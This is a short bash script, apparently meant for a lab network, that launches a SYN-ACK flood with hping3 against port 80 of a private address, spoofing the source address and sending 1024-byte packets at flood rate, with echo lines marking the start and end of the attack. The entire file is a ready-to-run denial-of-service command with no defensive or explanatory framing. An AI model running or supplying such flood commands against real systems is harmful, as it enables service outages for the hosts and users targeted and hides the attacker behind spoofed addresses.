#1/bin/bash

echo "Starting SYN-ACK flood attack ..."
sudo hping3 -S -A --flood -p 80 --interface eth4 --data 1024 -a 10.1.2.2 10.1.5.2 
echo "SYN-ACK flood attack completed"
